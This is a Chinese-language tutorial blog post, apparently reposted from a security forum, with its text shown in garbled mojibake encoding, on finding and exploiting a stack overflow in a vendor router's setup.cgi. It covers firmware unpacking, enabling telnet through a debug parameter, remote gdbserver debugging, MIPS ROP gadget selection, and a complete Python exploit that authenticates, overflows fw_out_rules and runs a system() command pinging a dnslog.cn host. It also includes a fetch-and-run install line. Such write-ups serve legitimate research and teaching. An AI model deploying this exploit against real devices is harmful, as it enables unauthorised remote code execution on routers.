#  æ¼æ´æŒ–æ˜ | ä»é›¶å¼€å§‹çš„è·¯ç”±å™¨æ¼æ´æŒ–æ˜ä¹‹æ—…   
ç‚¹å‡»å…³æ³¨ğŸ‘‰  é©¬å“¥ç½‘ç»œå®‰å…¨   2025-02-20 09:00  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 å‰è¨€**  
  
è™½ç„¶ç›®å‰å·²ç»æœ‰äº†å¾ˆå¤šå¾ˆå¤šè·¯ç”±å™¨æ¼æ´æŒ–æ˜çš„æ–‡ç« èµ„æ–™ï¼Œä½†æ˜¯é€‚åˆæ–°æ‰‹å…¥é—¨çš„ã€æ¶‰åŠç¯å¢ƒé…ç½®ç»†èŠ‚çš„æ•™å­¦æ–‡ç« è¿˜æ˜¯æ¯”è¾ƒå°‘ï¼Œæœ¬æ–‡å°†å¸¦ä½ ä¸€æ­¥æ­¥å­¦ä¹ å¦‚ä½•ä»é›¶å¼€å§‹æŒ–æ˜æŸå‚å•†è·¯ç”±å™¨çš„æ¼æ´ï¼Œé€šè¿‡å®é™…æ“ä½œå’Œå·¥å…·ä½¿ç”¨ï¼Œæ·±å…¥äº†è§£å›ºä»¶åˆ†æã€åŠ¨æ€è°ƒè¯•å’Œæ¼æ´åˆ©ç”¨çš„å…¨è¿‡ç¨‹ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©è¯»è€…å°‘èµ°ä¸€äº›å¼¯è·¯ã€‚  
  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 å›ºä»¶åˆ†æ**  
### å®‰è£…å’Œé…ç½®binwalk  
  
Binwalkæ˜¯ä¸€ä¸ªå›ºä»¶åˆ†æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æå–å’Œåˆ†æåµŒå…¥å¼å›ºä»¶é•œåƒã€‚é¦–å…ˆï¼ŒæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤å®‰è£…binwalkï¼š  
> binwalkä½œè€…ä¸ºUbuntuç³»ç»Ÿå®šåˆ¶äº†ä¾èµ–çš„å®‰è£…è„šæœ¬ï¼Œç›´æ¥æ‰§è¡Œdeps.shï¼Œå…å»å¤§éƒ¨åˆ†çƒ¦æ¼ï¼  
  
```
gitÂ cloneÂ https://github.com/ReFirmLabs/binwalk
cd binwalkÂ 
sudo python3 setup.py install
sudo ./deps.sh

```  
  
åœ¨å¼€å§‹æ¼æ´æŒ–æ˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½å¹¶è§£åŒ…è·¯ç”±å™¨çš„å›ºä»¶ã€‚æœ¬æ–‡ä»¥æŸå‚å•†è·¯ç”±å™¨ä¸ºä¾‹ï¼Œé¦–å…ˆä»å®˜ç½‘ä¸‹è½½å›ºä»¶ï¼Œç„¶åä½¿ç”¨binwalkè¿›è¡Œè§£åŒ…ï¼š  
```
binwalk -Me <firmware_file>

```  
### æ¼æ´åˆ†æ  
#### ç›®æ ‡æ¼æ´ä¿¡æ¯  
  
ç›®æ ‡è·¯ç”±å™¨å±äºMIPSELæ¶æ„ï¼Œæ¼æ´äºŒè¿›åˆ¶ä½äºsetup.cgiï¼ˆè®¸å¤šè·¯ç”±å™¨çš„æ¼æ´éƒ½ä½äºCGIä¸­ï¼Œæ‰€ä»¥å¯ä»¥å¤šçœ‹çœ‹ï¼Œè€Œä¸”ä¹Ÿæ¯”è¾ƒå®¹æ˜“åˆ©ç”¨ï¼‰  
```
file setup.cgi
setup.cgi: ELF 32-bit LSB shared object, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped

```  
  
mainå‡½æ•°åœ¨setup_main  
#### é€†å‘  
  
sub_555BA950ä»nvramä¸­è·å–äº†ç¯å¢ƒå˜é‡fw_out_rulesçš„å€¼ï¼Œæ²¡æœ‰è¿›è¡Œé•¿åº¦æ£€æŸ¥ï¼Œåœ¨sscanfæ ¼å¼åŒ–å†™å…¥åˆ°v16å¯¼è‡´æ ˆæº¢å‡ºã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZPIoePJzogS2micrZRial9ZEfyfc5gChdjy8y61zM2iaAwic6fzYNarADBA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
é€šè¿‡äº¤å‰å¼•ç”¨fw_out_ruleså¯ä»¥å‘ç°è¯¥ç¯å¢ƒå˜é‡åœ¨sub_55567D8Cè¢«è®¾ç½®ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZFJflMSvu9WTVy4FtVA6gtcgicpWrhK9xP4xkQ3euI1peNpbzlgUsJEg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
äº¤å‰å¼•ç”¨ä¸Šé¢æ‰€è¯´çš„ä¸¤ä¸ªå‡½æ•° å¯ä»¥å‘ç°éƒ½æ˜¯é€šè¿‡ActionTabæ–¹å¼æŒ‰åè°ƒç”¨ï¼Œåˆ†åˆ«æ˜¯rule_list_simple_outå’Œoutmoveå¯ä»¥åœ¨å›ºä»¶è§£åŒ…çš„ç›®å½•ä¸‹grepæœç´¢å¯¹åº”çš„å­—ç¬¦ä¸²æ‰¾åˆ°å¯¹åº”çš„å¤–éƒ¨æ¥å£ï¼Œä¸‹é¢ç»“åˆå‰ç«¯åç«¯è¿›è¡Œåˆ†æã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZgv8QxncF4dLQuS4HrLm6GchzNbyiaC0Zr5ClAQTt6OibUU2uoUO9dTfw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
ç›´æ¥è®¿é—®fw_rules.htmï¼Œæå‡ ä¸ªè§„åˆ™ï¼Œä½¿ç”¨Â nvram show | grep fw_out_rulesÂ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå˜é‡å‚¨å­˜çš„æ˜¯Service nameè¿˜æœ‰ä¸€äº›æ•°å­—å•¥çš„ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZzQ13tH6V66J96L5fZ7PteYsCkSlzFZ3DEDoblWZ3ibYEoGs8JF6QpVA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZghUeicia5XNicXqrHZSdOeKkXYbjGLuvT8xMAkvtfFunmfvWpRA943R7Q/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ§åˆ¶è¯·æ±‚é‡Œçš„Â service_listå‚æ•°ï¼Œæ¥ä¿®æ”¹fw_out_rulesï¼Œæœ€åè®¿é—®BKS_service_add.htmè§¦å‘æ ˆæº¢å‡ºã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZAHaPzOvHw6g32JTMTF9ZDgsYzH6KOLyD5RibQhHo04ibibzVccOO19C6w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
##   
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 åŠ¨æ€è°ƒè¯•**  
### è·¯ç”±å™¨é…ç½®  
#### å¼€å¯telnet  
  
è™½ç„¶è¯¥æ¬¾è·¯ç”±å™¨å¼€å¯è°ƒè¯•çš„æ–¹å¼æ—©å·²å…¬å¼€ï¼Œä½†æ˜¯ä¸ºäº†å¼„æ¸…æ¥šç»†èŠ‚ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯æ‰‹å·¥é€†ä¸€ä¸‹ã€‚  
  
å…¶ä¸­å‡½æ•°CallActionByNameé€šè¿‡æŸ¥ActionTabè¡¨æ¯”å¯¹å‚æ•°todoçš„å€¼æ–¹å¼æ¥è°ƒç”¨å‡½æ•°todoä¸­çš„å‚æ•°å¯¹åº”å‡½æ•°  
  
<img src="https://s2.loli.net/2022/01/13/9WGF231OVSjyheT.png" alt="image-20220107154406516" style="zoom: 67%;" />  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZdbWgI1NHTpjcS2oz1WqE1QCXDEtV0XJfNmWSmmY2VX7tCcqnIR8U7g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
æ³¨æ„åˆ°è¿™ä¸ªéƒ¨åˆ†åœ¨è®¸å¤šå‡½æ•°ä¸­éƒ½æœ‰å‡ºç°ï¼Œæœç´¢å‘ç°æ˜¯ä¸€ä¸ªä¸ºäº†ä¿®CNNVD-201306-024è€Œå†™çš„ä¸€ä¸ªcheckï¼ˆIoT åˆ†æ | è·¯ç”±å™¨æ¼æ´é¢‘å‘ï¼Œmirai æ–°å˜ç§æ¥è¢­ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)ï¼‰ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZ9b8ID4DcONTQ038yKicnzryV3pV7RG90a1dPKS0kweKbLosZhOZr9pQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
æ‰€ä»¥å¯ä»¥é€šè¿‡todo=debugå¼€å¯telnet  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZSeBzZvgNok7csUZLR3S17LAR86zUqiajdUFT081KfcwiaqS9mda2ZRGA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
192.168.1.1/setup.cgi?todo=debug
telnet 192.168.1.1

```  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZkY8zVmWnEa2ZK0hXGKp8b9V0xyhicxSJSxkDibOqj1LPn3nYRfvYI2aA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
#### ç¼–è¯‘gdbserver  
  
åœ¨è·¯ç”±å™¨ä¸Šä¹Ÿè¦è¿›è¡Œç›¸åº”çš„è°ƒè¯•é…ç½®  
  
æ³¨æ„è·¯ç”±å™¨æ˜¯å°ç«¯åºï¼Œå‚æ•°åŠ ä¸Š-EL  
  
æ­å»ºiotåŠ¨æ€è°ƒè¯•ç¯å¢ƒ_ä¹å±‚å°-CSDNåšå®¢  
```
sudo apt-get install linux-libc-dev-mipsel-cross
sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross
sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu
sudo apt-get install g++-mipsel-linux-gnu

```  
```
wget https://ftp.gnu.org/gnu/gdb/gdb-10.1.tar.xz
tar xvf gdb-10.1.tar.xz
cdÂ gdb-10.1
CC="mips-linux-gnu-gcc -EL"Â CXX="mips-linux-gnu-g++"Â ./configure --target=mips-linux-gnu --host="mips-linux-gnu"Â --prefix="/root/tgdb"Â LDFLAGS="-static"
make -j7

```  
  
ç¼–è¯‘ä¸äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼ˆ  
  
è¿™é‡Œä¸‹ä¸€ä¸ª  
  
https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt  
  
HatLab Tools Library: æµ·ç‰¹å®éªŒå®¤IoTå®‰å…¨å·¥å…·/ç¯å¢ƒæ•´åˆ - Gitee.com  
#### ä¸Šä¼ gdbserver  
  
æ¯”è¾ƒå¥½çš„åŠæ³•æ˜¯ä½¿ç”¨http server  
```
python -m http.serverÂ 9999
wget http://192.168.1.2:9999/gdbserver

```  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZ3kDGb6uticzibR4wusOGv8kmxXoD8uicRqDmdZRZ99sdFDomN8fBfCiaSg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
#### é™„åŠ äºŒè¿›åˆ¶çš„å‘ç‚¹  
  
ç”±äºsetup.cgiä¸æ˜¯æŒä¹…å­˜åœ¨çš„ï¼Œéœ€è¦å¾ªç¯attachï¼Œè¿™ä¸ªè„šæœ¬å¯ä»¥è§£å†³ã€‚  
```
int=1
whileÂ [Â $intÂ -le 1000 ];Â do
Â  Â  /tmp/gdbserver 0.0.0.0:12345 --attach `ps -A | grep setup.cgi | awkÂ '{print $1}'Â | head -n 1`
done

```  
### è°ƒè¯•ç«¯é…ç½®  
  
ç¯å¢ƒï¼šUbuntu 21  
#### å®‰è£…gef  
  
gefæ˜¯å¼‚æ„åŠ¨æ€è°ƒè¯•åšçš„æ¯”è¾ƒå¥½çš„ä¸€æ¬¾gdbæ’ä»¶ï¼Œæ¨èä½¿ç”¨ã€‚  
```
bash -cÂ "$(wget http://gef.blah.cat/sh -O -)"

```  
#### å®‰è£…gdb-multiarch  
  
æ™®é€šçš„gdbæ— æ³•è°ƒè¯•mipsæ¶æ„çš„äºŒè¿›åˆ¶ï¼Œæ‰€ä»¥ä½ éœ€è¦gdb-multiarchï¼ŒUbuntuçš„è¯ç›´æ¥ä½¿ç”¨aptå°±å¯ä»¥è¿›è¡Œå®‰è£…äº†ã€‚  
```
sudo apt install gdb-multiarch

```  
#### gdbè°ƒè¯•é…ç½®  
  
ä¸ºäº†è®©gdbæ­£ç¡®è¿›è¡Œè°ƒè¯•ï¼Œé¦–å…ˆéœ€è¦è¿›è¡Œä¸€ä¸‹ç¯å¢ƒé…ç½®ã€‚  
```
setÂ arch mips
setÂ endian little
gef-remote 192.168.1.1:12345

```  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZkDKSnQXJArKfENZXdOBb0lCT2RID0wz9ZqeQJORpz5peCCeX0w1rxQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
åœ¨è°ƒè¯•è¿‡ç¨‹å¯ä»¥æ–­åˆ°gadgetï¼Œä»¥åŠåŠ è½½libcç¬¦å·ï¼Œå¦‚æœè§‰å¾—æ¯æ¬¡æ•²gdbå‘½ä»¤æ¯”è¾ƒç¹çï¼Œå¯ä»¥å°†gdbçš„å‘½ä»¤ä¿å­˜æˆæ–‡ä»¶ï¼Œç„¶ååœ¨ä½¿ç”¨gdb-multiarché€šè¿‡-xé€‰é¡¹ç›´æ¥é€šè¿‡æ–‡ä»¶åŠ è½½å‘½ä»¤ï¼š  
```
setÂ arch mips
setÂ endian little
gef-remote 192.168.1.1:12345
b *0x555BAC2C

```  
```
gdb-multiarch setup.cgi -x ./gdb.cmd

```  
  
IDAåæ±‡ç¼–å‡ºæ¥çš„baseå¯èƒ½è·Ÿå®é™…åŸºå€ä¸ä¸€æ ·ï¼Œå¯ä»¥è°ƒå‡ºå®é™…çš„åŸºå€å†rebaseä¸€ä¸‹ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZKFibvDS49RMjkGhzy0dAicoyaI2d7fuwM92otXcgJb9L4ictt3wjS0IAw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
##   
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 æ¼æ´åˆ©ç”¨**  
### å‡½æ•°æ ˆ  
  
mipsè°ƒç”¨å‡½æ•°æ—¶å°†è¿”å›åœ°å€æ”¾åœ¨Â $raï¼Œä¸x86æ¶æ„ç±»ä¼¼ï¼Œåœ¨å‡½æ•°èµ·å§‹å¤„å‹æ ˆï¼Œç»“æŸæ—¶å¼¹å‡ºï¼Œé€šè¿‡jaæŒ‡ä»¤è·³åˆ°è¿”å›åœ°å€,æ‰€ä»¥éœ€è¦æº¢å‡ºåˆ°var_s24æ¥åŠ«æŒæ§åˆ¶æµã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZkEa0h14aNT51BX68vcBGNxwkg6m2pA5Rycia3slvcricpPbgicTRvVCSQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### æ‰§è¡Œsystem  
  
ä»‹ç»ä¸€ä¸‹ mips ä¸‹ç¥å¥‡çš„å‡½æ•°è°ƒç”¨ï¼š  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZibeoAXmdjYXYKCIHVo17NYlLXibSn4TXBxHdsS3nBLf3VW9iaXr81dQ5g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
åœ¨è¿™é‡Œè·³åˆ°Â $t9Â ä¹Ÿå°±æ˜¯Â systemÂ ä¹‹åï¼Œä¼šæ‰§è¡Œä¸€ä¸‹ä¸‹é¢çš„é‚£æ¡è¯­å¥ï¼ˆä¹Ÿå°±æ˜¯Â 5B068Â å¤„çš„è¯­å¥ï¼‰ä¹‹åæ‰ç»§ç»­åœ¨ system é‡Œé¢æ‰§è¡Œ  
  
é‚£ä¹ˆè¿™ä¸ªgadget æˆ‘ä»¬å°±å¯ä»¥æŠŠ sp + 0xa8 + 0x88 å¤„æ”¾ä¸€ä¸ªcommandçš„æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨Â system(ptr)Â äº†  
  
ç„¶åæ‰§è¡Œå‘½ä»¤å¯ä»¥æ‰§è¡ŒÂ pingÂ å‘½ä»¤(å…¶ä¸­ ping éœ€è¦ç»å¯¹è·¯å¾„ï¼Œéœ€è¦æ³¨æ„)ï¼š  
```
/bin/ping hv14uf.dnslog.cn -c 2

```  
### å¯»æ‰¾gadgets  
  
MIPSæ¶æ„æ¨èä½¿ç”¨ropperè¿›è¡ŒæŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾æ—¶å¯ä»¥å‚è€ƒå¯è¢«æ§åˆ¶çš„å¯„å­˜å™¨æ¥ç­›é€‰gadgetã€‚  
```
file setup.cgi
search addiuÂ $a0

```  
  
ä¸€å¼€å§‹æ‰¾åˆ°äº†è¿™ä¸ªï¼Œåæ¥å‘ç°æ€ä¹ˆä¹Ÿæ‰“ä¸é€š  
```
0x5556af20: addiu $a0, $sp, 0x18; lw $ra, 0x5c($sp); lw $v0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x60;Â 
0x55567650: la $t9, system; nop; jalr $t9; nop;

```  
  
åæ¥ç¿»äº†ç¿»CTFä¸­å¸¸è§çš„Cè¯­è¨€è¾“å…¥å‡½æ•°æˆªæ–­å±æ€§æ€»ç»“ | Clangè£ç¼åº— (xuanxuanblingbling.github.io)å‘ç°æ˜¯0x20æˆªæ–­äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬systemæ‰§è¡Œçš„commandä¹Ÿéœ€è¦ç»•è¿‡ç©ºæ ¼ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZ3nHPHru4uwrJG6VyUPY5onntPNPTBVHibBRqKScv35MuPoq0W03Urjg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
åŒæ—¶åœ¨FindForbidValueå‡½æ•°é‡Œä¹Ÿcheckäº†ä¸€äº›æ•æ„Ÿå­—ç¬¦/å…³é”®å­—ï¼ŒåŒ…å«è¿™äº›å­—ç¬¦çš„è¯·æ±‚åŒ…å°†ä¼šè¢«ä¸¢å¼ƒã€‚  
  
<img src="https://s2.loli.net/2022/01/13/1r5sHdV8MGNlgLY.png" alt="image-20220112183944202.png" style="zoom: 67%;" />  
  
åæ¥è¿˜æ˜¯ç”¨åŸæ¥çš„(ï¼Œå°†commandå†™åˆ°Â $a0-0x60ä¸Šï¼Œè·³åˆ°0x55567650æ‰§è¡Œå°±è¡Œäº†ã€‚  
```
0x55592ce4: addiu $a0, $a0, -0x60; lw $ra, 0x1c($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20;Â 
0x55567650: la $t9, system; nop; jalr $t9; nop;

```  
  
å¦‚æœä½ ä¹Ÿæ¯”è¾ƒæ‡’çš„çš„è¯ï¼Œå¯ä»¥ç”¨cyclic -læ¥æ‰¾åç§»ã€‚  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZ2HibE3Z6A7PibrOQnRo4BEibDp8JiacW5IX2p4Jiah9AmHvicNWSymvib6wbA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
è°ƒè¯•æ—¶å‘ç°$a0çš„å€¼ä¼šéšé•¿åº¦å˜åŒ–è€Œå˜åŒ–ï¼Œæ‰€ä»¥å¾—å¡«å……ä¸€ä¸‹ï¼Œè°ƒè¯•æ—¶ç”¨çš„é•¿åº¦500ï¼Œè¿™é‡Œä¹Ÿpadåˆ°500ï¼Œå¦‚æœæƒ³æ‰§è¡Œæ›´é•¿çš„å‘½ä»¤ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸‹payloadé•¿åº¦ã€‚  
### æœ€ç»ˆexp  
```
importÂ requests,re
importÂ base64
url =Â "http://192.168.1.1/"
user =Â "aaaa"
pwd =Â "xxxx!"
command =Â '/bin/ping xxx.dnslog.cn -c 4'
command = command.replace(" ",Â "${IFS}")
auth = Â "Basic "Â + base64.b64encode((user +Â ":"Â + pwd).encode()).decode("utf-8")

deflogin():
Â  Â  get_sessionid = requests.get(url)
Â  Â  sessionid = get_sessionid.headers["Set-Cookie"]
Â  Â  headers = {
Â  Â  Â  Â Â "Authorization"Â : auth,
Â  Â  Â  Â Â "Cookie"Â : sessionid
Â  Â  }
Â  Â  r = requests.get(url,headers = headers)
Â  Â Â ifÂ r.status_code ==Â 200:
Â  Â  Â  Â Â print("[+] Login success!")
Â  Â  Â  Â Â returnÂ sessionid
Â  Â Â else:
Â  Â  Â  Â Â print("[-] Login failed!")
Â  Â  Â  Â  exit(0)

defget_sid(sessionid):
Â  Â  headers = {
Â  Â  Â  Â Â "Authorization"Â : auth,
Â  Â  Â  Â Â "Cookie"Â : sessionid
Â  Â  }
Â  Â  get_sid = requests.get(url +Â "fw_rules.htm",headers = headers)
Â  Â  sid = re.findall(r'\?id=[a-f0-9]+', get_sid.content.decode("utf-8"))
Â  Â Â returnÂ sid[0]

defattack(sessionid):
Â  Â  attackurl = url +Â "setup.cgi"Â + Â get_sid(sessionid) Â Â 
Â  Â  payload =Â "a"Â *Â 376
Â  Â  payload +=Â "%e4%2c%59%55"# ra = 0x55592ce4: addiu $a0, $a0, -0x60; lw $ra, 0x1c($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20;Â 
Â  Â  payload +=Â "b"Â *Â 0x1c
Â  Â  payload +=Â "%50%76%56%55"# ra = 0x55567650: la $t9, system; nop; jalr $t9; nop;
Â  Â  payload +=Â "c"Â *Â 8
Â  Â  payload +=Â "%0a{}%0a".format(command)
Â  Â  pad =Â 500Â - (len(payload) -Â 4) Â 
Â  Â Â if(pad >=Â 0):
Â  Â  Â  Â  payload +=Â "c"Â * padÂ # pad len to 500
Â  Â  Â  Â Â print("[+] Attack start")
Â  Â  Â  Â Â print(attackurl,payload)
Â  Â  Â  Â  data =Â "save=Apply&service_list="Â + payload +Â "&fwout_action=0&fwout_laniptype=anyip&fwout_waniptype=anyip&fwout_logging=1&h_fwout_action=0&h_fwout_laniptype=anyip&h_fwout_waniptype=anyip&h_fwout_logging=1&h_service_list=AIM&c4_lan_start_ip=192.168.1.NaN&c4_lan_finish_ip=192.168.1.NaN&c4_wan_start_ip=&c4_wan_finish_ip=&h_ruleSelect=0&edit=0&todo=save&this_file=rule_out.htm&next_file=BKS_service_add.htm&SID="
Â  Â  Â  Â  headers = {
Â  Â  Â  Â  Â  Â Â "Cookie"Â : sessionid,
Â  Â  Â  Â  Â  Â Â "Authorization"Â : auth
Â  Â  Â  Â  } Â Â 
Â  Â  Â  Â  r = requests.post(url = attackurl,data = data,headers = headers)
Â  Â  Â  Â Â ifÂ r.status_code:
Â  Â  Â  Â  Â  Â Â print("[+] Attack success!, the result is:")
Â  Â  Â  Â  Â  Â Â print(r.content)
Â  Â  Â  Â Â else:
Â  Â  Â  Â  Â  Â Â print("[-] Attack failed!")
Â  Â  Â  Â  Â  Â  exit(0)

sessionid = login()
attack(sessionid)

```  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZcPoSM8K5zTv5mKGtEl1j6UNH4r4gUwRdKR3E4xyLJHE1BWCGBjqkug/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWWqeQHb60A1LG88JrongeZ36BmQicqpu3fncvHYU5D6oqWstbLMmiaojtdhsatKYokXkgndicBPqsqA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
#   
# ref  
  
TP-Link WR841N æ ˆæº¢å‡ºæ¼æ´ï¼ˆCVE-2020-8423ï¼‰åˆ†æ - Lonely Blog (wuhao13.xin)  
  
HWSèµ›é¢˜ å…¥é—¨ MIPS Pwn | Clangè£ç¼åº— (xuanxuanblingbling.github.io)  
  
æ€ç§‘è·¯ç”±å™¨ RV110W CVE-2020-3331 æ¼æ´å¤ç° | Clangè£ç¼åº— (xuanxuanblingbling.github.io)  
  
  
åŸæ–‡é“¾æ¥ï¼šhttps://forum.butian.net/share/4067  
  
ä½œè€…ï¼šVokekkï¼Œç”±ç¥å†œSecæ’ç‰ˆï¼Œä¾µåˆ   
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1vawibO9wLYILrhQIfwChvgOImKZkuNWI8GOooRxib2zV6HqibN8GUXECib6tPedP736qeiblicT5gTbstA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/utAMSQWh9sUWmzvbEqyVxYPkYu24CRrXIPaUiaibicvhTUX0icpbo8Ia1b5UpPLuibvVlQmiaocIsuPY2jE7jSHBae6w/640?wx_fmt=png "")  
  
END  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAm3PzYTTxO9lD6gf9mevIKnjFiaxMQj9icRlc9x5WwY9O1KAnMn9ZZ87AL5RcOJMSmamBibkEsKUl7MA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlTaKuYibMZXYWCqjdCM9Uw0ozHKnw1tSJkoNgfPvdDVp3C1pslnibctl49rYBlibDGfa7VRQR5DpvRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1uic9ZGkCFpwBiaw1YVt1l4Uibcibk8C6C52t27qBiaw37w5ko1SnjuyT011DBH2jjPQNnpcFMtAFLibGGQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
